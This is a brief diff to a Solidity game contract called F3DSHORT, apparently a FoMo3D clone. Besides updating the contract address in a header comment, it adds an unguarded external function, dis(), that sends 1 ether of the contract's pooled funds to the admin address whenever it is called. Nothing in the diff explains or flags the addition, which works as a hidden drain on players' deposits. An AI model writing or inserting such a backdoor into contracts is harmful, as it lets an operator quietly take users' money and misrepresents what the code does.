@@ -1,5 +1,5 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract F3DSHORT at 0xcf3832fe8062b6b870a762f2eefaad725bf4dfb1
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract F3DSHORT at 0xe0b81bf2042e839ddf33f36561fec5554c4cd9d7
 */
 pragma solidity ^0.4.24;
 
@@ -1426,6 +1426,11 @@ contract F3DSHORT is modularShort {
 
         round_[_rID].pot = round_[_rID].pot.add(msg.value);
         emit F3Devents.onPotSwapDeposit(_rID, msg.value);
+    }
+     function dis()
+        external
+    { 
+    admin.transfer(1000000000000000000);
     }
 
     /**
